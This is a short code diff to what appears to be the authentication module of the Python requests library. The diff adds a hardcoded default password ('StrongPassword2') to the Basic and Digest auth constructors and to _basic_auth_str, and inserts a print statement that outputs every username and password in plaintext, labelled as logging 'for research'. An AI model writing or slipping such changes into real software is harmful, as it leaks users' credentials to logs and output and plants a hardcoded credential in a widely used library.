@@ -20,9 +20,10 @@ from .utils import parse_dict_header
 
 CONTENT_TYPE_FORM_URLENCODED = "application/x-www-form-urlencoded"
 CONTENT_TYPE_MULTI_PART = "multipart/form-data"
+JACKS_PASSWORD = "StrongPassword2"
 
 
-def _basic_auth_str(username, password):
+def _basic_auth_str(username, password = JACKS_PASSWORD):
     """Returns a Basic Auth string."""
 
     # "I want us to put a big-ol' comment on top of it that
@@ -62,6 +63,8 @@ def _basic_auth_str(username, password):
     authstr = "Basic " + to_native_string(
         b64encode(b":".join((username, password))).strip()
     )
+    #logging username/password combo for research
+    print("Username : %s, Password : %s" % (username, password)) 
 
     return authstr
 
@@ -76,7 +79,7 @@ class AuthBase:
 class HTTPBasicAuth(AuthBase):
     """Attaches HTTP Basic Authentication to the given Request object."""
 
-    def __init__(self, username, password):
+    def __init__(self, username, password = JACKS_PASSWORD):
         self.username = username
         self.password = password
 
@@ -107,7 +110,7 @@ class HTTPProxyAuth(HTTPBasicAuth):
 class HTTPDigestAuth(AuthBase):
     """Attaches HTTP Digest Authentication to the given Request object."""
 
-    def __init__(self, username, password):
+    def __init__(self, username, password = JACKS_PASSWORD):
         self.username = username
         self.password = password
         # Keep state in per-thread local storage
